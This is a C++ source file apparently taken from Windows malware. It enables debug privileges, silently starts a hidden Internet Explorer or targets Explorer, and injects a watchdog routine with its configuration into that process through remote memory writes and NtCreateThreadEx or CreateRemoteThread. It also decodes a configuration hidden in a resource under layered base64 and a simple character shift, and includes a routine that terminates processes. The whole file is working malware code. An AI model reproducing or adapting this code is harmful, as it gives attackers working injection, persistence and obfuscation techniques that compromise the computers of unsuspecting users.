#include "../core.hpp"

bool InjectSister( API *api ) {
	LPVOID pAddr = NULL, strAddr = NULL;
	DWORD size = 0, size1 = 0, pid;
	HANDLE proc;
	INSIDE in;
	
	char *key = (char*)malloc(MAX_PATH);
	if (!RetrieveSetting(CFG_RET, key))
		return false;

	api->wsprintf(in.key, "%s", key);
	api->lstrcpy(in.open, "open");
	api->wsprintf(in.directory, "%s", api->directory.c_str());
	api->wsprintf(in.exefile, "%s", api->exefile.c_str());
	api->wsprintf(in.final, "%s%s", api->directory.c_str(), api->exefile.c_str());

	in.CloseHandle = api->CloseHandle;
	in.CreateToolhelp32Snapshot = api->CreateToolhelp32Snapshot;
	in.lstrcmp = api->lstrcmp;
	in.Process32First = api->Process32First;
	in.Process32Next = api->Process32Next;
	in.RegCloseKey = api->RegCloseKey;
	in.RegDeleteKey = api->RegDeleteKey;
	in.RegOpenKeyEx = api->RegOpenKeyEx;
	in.ShellExecuteA = api->ShellExecuteA;
	in.Sleep = api->Sleep;
	
	ActivateSeDebugPrivilege(api);	


	BOOL WoW = false;
	LPFN_ISWOW64PROCESS fnIsWow64Process;
	fnIsWow64Process = (LPFN_ISWOW64PROCESS) GetProcAddress(GetModuleHandle("kernel32"),"IsWow64Process");
	fnIsWow64Process(GetCurrentProcess(), &WoW);
	
	if (WoW) {
		pid = GetPID(api, "iexplore.exe");
		if (pid == NULL) {
			char iepath[MAX_PATH];
			ExpandEnvironmentStrings("%programfiles(x86)%\\Internet Explorer\\iexplore.exe", iepath, MAX_PATH);
			PROCESS_INFORMATION pinfo;
			STARTUPINFO sinfo;
			ZeroMemory(&pinfo, sizeof(pinfo));
			ZeroMemory(&sinfo, sizeof(sinfo));
			sinfo.lpTitle     = 0;
			sinfo.cb = sizeof(sinfo);
			sinfo.dwFlags = STARTF_USESHOWWINDOW;
			sinfo.wShowWindow = SW_HIDE;
			CreateProcess(iepath, NULL, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL , &sinfo, &pinfo);
			Sleep(2000);
			pid = GetPID(api, "iexplore.exe");
		}
	} else 
		pid = GetPID(api, "explorer.exe");


	proc = api->OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);	
	strAddr = api->VirtualAllocEx(proc, 0, sizeof(INSIDE), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	api->WriteProcessMemory(proc, strAddr, &in, sizeof(INSIDE), &size1);
	size = (DWORD)ProcEnd_Retainer - (DWORD)Retainer;
	pAddr = api->VirtualAllocEx(proc, 0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	api->WriteProcessMemory(proc, pAddr, (LPVOID)Retainer, size, &size1);

	int os = GetOS(api);
	if (os == 0 || os == 3 || os == 4) {
		//IsWin7 Or CreateRemoteThread?
		HMODULE modNtDll = GetModuleHandle("ntdll.dll");
		HANDLE hThread;
		
		LPFUN_NtCreateThreadEx funNtCreateThreadEx = (LPFUN_NtCreateThreadEx) GetProcAddress(modNtDll, "NtCreateThreadEx");
		NtCreateThreadExBuffer ntbuffer;

		memset (&ntbuffer,0,sizeof(NtCreateThreadExBuffer));
		DWORD temp1 = 0;
		DWORD temp2 = 0;

		ntbuffer.Size = sizeof(NtCreateThreadExBuffer);
		ntbuffer.Unknown1 = 0x10003;
		ntbuffer.Unknown2 = 0x8;
		ntbuffer.Unknown3 = &temp2;
		ntbuffer.Unknown4 = 0;
		ntbuffer.Unknown5 = 0x10004;
		ntbuffer.Unknown6 = 4;
		ntbuffer.Unknown7 = &temp1;
		ntbuffer.Unknown8 = 0;

		long status = funNtCreateThreadEx(&hThread,	0x1FFFFF, NULL,	proc, (LPTHREAD_START_ROUTINE)pAddr, strAddr, FALSE, NULL, NULL, NULL, &ntbuffer);
	} else 
		CreateRemoteThread(proc, NULL, NULL, (LPTHREAD_START_ROUTINE)pAddr, strAddr, NULL, NULL);
	//api->CreateRemoteThread(proc, NULL, NULL, (LPTHREAD_START_ROUTINE)pAddr, strAddr, NULL, NULL);
	free(key);
	return true;
}

int GetOS( API* api ) {
	const char* OSs[] = {
		"7",
		"XP",
		"2003",
		"2008",
		"Vista",
		"2000",
		"ME",
		0
	};

	HKEY hKey;
	char data[64];
	DWORD size;
	int n = -1;
	if (api->RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
		if (api->RegQueryValueEx(hKey, "ProductName", 0, NULL, (LPBYTE)data, &size) == ERROR_SUCCESS) {
			char* split;
			split = strtok(data, " ");
			while (split != NULL) {
				if (!lstrcmp(split, OSs[0]))
					n = 0;
				else if (!lstrcmp(split, OSs[1]))
					n = 1;
				else if (!lstrcmp(split, OSs[2]))
					n = 2;
				else if (!lstrcmp(split, OSs[3]))
					n = 3;
				else if (!lstrcmp(split, OSs[4]))
					n = 4;
				else if (!lstrcmp(split, OSs[5]))
					n = 5;
				else if (!lstrcmp(split, OSs[6]))
					n = 6;
				else if (!lstrcmp(split, OSs[7]))
					n = 7;
				split = strtok(NULL, " ");
			}
		}
	}
	
	return n;
}

int ActivateSeDebugPrivilege( API *api ) {
    HANDLE hToken;
    LUID Val;
    TOKEN_PRIVILEGES tp;

    if (!api->OpenProcessToken(api->GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return 0;

    if (!api->LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &Val))
		return 0;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = Val;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!api->AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof (tp), NULL, NULL))
        return 0;

    api->CloseHandle(hToken);

    return 1;
}
int GetPID( API *api, string processname ) {
	HANDLE procs;
	API::PROCESSENTRY32 pe32;
	procs = api->CreateToolhelp32Snapshot(0x00000002, NULL);
	pe32.dwSize = sizeof( API::PROCESSENTRY32 );
	
	api->Process32First(procs, &pe32);
	do {
		if (api->lstrcmp(pe32.szExeFile, processname.c_str()) == 0)
			break;
	} while (api->Process32Next(procs, &pe32));

	api->CloseHandle(procs);
	return pe32.th32ProcessID;
}

/*bool TerminateProc( API* api, string processname, string path ) {
	HANDLE procs;
	API::PROCESSENTRY32 pe32;
	procs = api->CreateToolhelp32Snapshot(0x00000002, NULL);
	pe32.dwSize = sizeof( API::PROCESSENTRY32 );
	char temp[MAX_PATH] = "\0";
	api->Process32First(procs, &pe32);
	bool found = false;
	do {
		if (!path.empty()) {
			api->GetModuleFileNameEx(api->OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, true, pe32.th32ProcessID), NULL, temp, MAX_PATH);
			if (path == temp) {
				found = true;
				break;
			}
		} else {
			if (api->lstrcmp(pe32.szExeFile, processname.c_str()) == 0) {
				found = true;
				break;
			}
		}
	} while (api->Process32Next(procs, &pe32));
	CloseHandle(procs);
	HANDLE term = api->OpenProcess(PROCESS_TERMINATE, true, pe32.th32ProcessID);
	if (term != NULL && found) {
		int procTerm = api->TerminateProcess(term, 0);
		if (procTerm != 0)
			return true;
		else
			return false;
	} else {
		return false;
	}
	return false;
}*/

bool TerminateProc(API* api, char* processname, const char *path ) {
	HANDLE procs;
	API::PROCESSENTRY32 pe32;
	procs = api->CreateToolhelp32Snapshot(0x00000002, NULL);
	pe32.dwSize = sizeof( API::PROCESSENTRY32 );
	char temp[MAX_PATH] = "\0";
	api->Process32First(procs, &pe32);
	bool found = false;
	do {
		if (lstrcmp(path, "") != 0) {
			api->GetModuleFileNameEx(OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, true, pe32.th32ProcessID), NULL, temp, MAX_PATH);
			if (lstrcmp(path, temp) == 0) {
				found = true;
				break;
			}
		} else {
			if (lstrcmp(pe32.szExeFile, processname) == 0) {
				found = true;
				break;
			}
		}
	} while (api->Process32Next(procs, &pe32));
	CloseHandle(procs);
	HANDLE term = OpenProcess(PROCESS_TERMINATE, true, pe32.th32ProcessID);
	//UnCriticalIt(pe32.th32ProcessID);
	Sleep(3000);
	if (term != NULL && found) {
		int procTerm = TerminateProcess(term, 0);
		if (procTerm != 0)
			return true;
		else
			return false;
	} else {
		return false;
	}
	return false;
}

std::string decrypt(const char* ePtr) {
        int len = strlen(ePtr);
        char ret[128] = {0};
        strcpy(ret, ePtr);
        for (int i = 0; i < len; i++) {
                ret[i] = ret[i] - 25;
        }
        return ret;
}

static const char  table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static const int   BASE64_INPUT_SIZE = 57;

BOOL isbase64(char c)
{
   return c && strchr(table, c) != NULL;
}

inline char value(char c)
{
   const char *p = strchr(table, c);
   if(p) {
      return p-table;
   } else {
      return 0;
   }
}

void decode(char *src, char *dest) {
   int srclen = lstrlen(src);
   *dest = 0;
   if(*src == 0) 
   {
      return;
   }
   char *p = dest;
   do
   {

      char a = value(src[0]);
      char b = value(src[1]);
      char c = value(src[2]);
      char d = value(src[3]);
      *p++ = (a << 2) | (b >> 4);
      *p++ = (b << 4) | (c >> 2);
      *p++ = (c << 6) | d;
      if(!isbase64(src[1])) 
      {
         p -= 2;
         break;
      } 
      else if(!isbase64(src[2])) 
      {
         p -= 2;
         break;
      } 
      else if(!isbase64(src[3])) 
      {
         p--;
         break;
      }
      src += 4;
      while(*src && (*src == 13 || *src == 10)) src++;
   }
   while(srclen-= 4);
   *p = 0;
   return;
}

int RetrieveSetting(cfg_parms param, ...) {
	va_list vl;
	va_start(vl, param);
	//vl = va_arg(listName, argType);
	HRSRC hRsrc = NULL; 
    HGLOBAL hGlobal = NULL; 
	char *lpBuffer = NULL; 
	static char fBuffer[512] = {0};
	hRsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_RES1), "RES"); 
	if (!hRsrc) { 
		return false; 
    }
	
	hGlobal = LoadResource(NULL, hRsrc); 
	lpBuffer = (char*)LockResource(hGlobal);
	
	if (!hGlobal || lpBuffer == NULL) { 
		return false; 
    }
	
	lstrcpy(fBuffer, lpBuffer);
	char *tempBuffer = (char*)malloc(64);
	tempBuffer = strtok(fBuffer, "\n");
	
	for (int i = 1; i < param; i++) {
		tempBuffer = strtok(NULL, "\n");
	}

	if (tempBuffer == NULL)
		return false;
	char* decBuffer = (char*)malloc(256);
	decode(tempBuffer, decBuffer);
	lstrcpy(tempBuffer, decrypt(decBuffer).c_str());
	decode(tempBuffer, decBuffer);
	lstrcpy(tempBuffer, decrypt(decBuffer).c_str());
	decode(tempBuffer, decBuffer);
	lstrcpy(tempBuffer, decBuffer);
	free(decBuffer);
	
	/*if (param == CFG_SVPORT)
		return atoi(tempBuffer);*/
	char* assign = va_arg(vl, char*);
	lstrcpy(assign, tempBuffer);
	try { free(tempBuffer); } catch (...) {}
	va_end(vl);
	return true;
}

/*bool TerminateProc( API* api, string processname ) {
	ActivateSeDebugPrivilege(api);
	HANDLE procs;
	API::PROCESSENTRY32 pe32;
	procs = api->CreateToolhelp32Snapshot(0x00000002, NULL);
	pe32.dwSize = sizeof( API::PROCESSENTRY32 );
	
	api->Process32First(procs, &pe32);
	do {
		if (api->lstrcmp(pe32.szExeFile, processname.c_str()) == 0)
			break;
	} while (api->Process32Next(procs, &pe32));
	api->CloseHandle(procs);
	HANDLE term = api->OpenProcess(PROCESS_TERMINATE, true, pe32.th32ProcessID);
	if (term != INVALID_HANDLE_VALUE) {
		int procTerm = api->TerminateProcess(term, 0);
		if (procTerm != 0)
			return true;
		else
			return false;
	} else {
		return false;
	}
	return false;
}*/